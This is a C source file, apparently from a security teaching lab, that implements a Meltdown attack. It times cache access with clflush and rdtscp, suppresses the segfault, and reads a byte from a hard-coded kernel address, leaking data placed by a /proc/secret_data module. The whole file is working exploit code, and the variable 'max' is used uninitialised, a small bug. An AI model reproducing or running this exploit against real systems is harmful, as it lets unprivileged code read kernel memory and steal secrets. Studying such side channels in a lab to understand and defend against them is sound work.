#include<stdio.h>
#include<stdint.h>
#include<unistd.h>
#include<string.h>
#include<signal.h>
#include<setjmp.h>
#include<fcntl.h>
#include<emmintrin.h>
#include<x86intrin.h>

uint8_t array[256*4096];
#define CACHE_HIT_THRESOLD (80)
#define DELTA 1024

void flushSideChannel() {
	int i;

	for (i = 0; i < 256; i++) {
		array[i*4096 + DELTA] = 1;
	}

	for (i = 0; i < 256; i++) {
		_mm_clflush(&array[i*4096 + DELTA]);
	}
}

static int scores[256];

void reloadSideChannelImproved() {
	int i;
	volatile uint8_t *addr;
	register uint64_t time1, time2;
	int junk = 0;

	for(i = 0; i < 256; i++) {
		addr = &array[i * 4096 + DELTA];
		time1 = __rdtscp(&junk);
		junk = *addr;
		time2 = __rdtscp(&junk) - time1;
		if (time2 < CACHE_HIT_THRESOLD) {
			scores[i]++;
		}
	}
}

void meltdown_asm(unsigned long kernel_data_addr) {

	char kernel_data = 0;

	asm volatile(
		".rept 400;"
		"add $0x141, %%eax;"
		".endr;"

		:
		:
		: "eax"
	);

	kernel_data = *(char*) kernel_data_addr;
	array[kernel_data * 4096 + DELTA] += 1;
}

static sigjmp_buf jbuf;
static void catch_segv() {
	siglongjmp(jbuf, 1);
}

int main(int argc, char** argv) {
	int i, j, ret = 0;

	signal(SIGSEGV, catch_segv);

	int fd = open("/proc/secret_data", O_RDONLY);
	if (fd<0) {
		perror("open");
		return -1;
	}

	memset(scores, 0, sizeof(scores));
	flushSideChannel();

	for(i = 0; i < 1000; i++) {
		ret = pread(fd, NULL, 0, 0);
		if (ret < 0) {
			perror("open");
			break;
		}
	}

	for (j = 0; j < 256; j++) {
		_mm_clflush(&array[j*4096 + DELTA]);
	}

	if (sigsetjmp(jbuf, 1) == 0) {
		meltdown_asm(0xf90fb000);
	}

	reloadSideChannelImproved();

	int max;
	for (i = 0; i < 256; i++) {
		if (scores[max] < scores[i]) {
			max = i;
		}
	}

	printf("The secret value is %d %c\n",max, max);
	printf("The number of hits is %d\n",scores[max]);

	return 0;
}


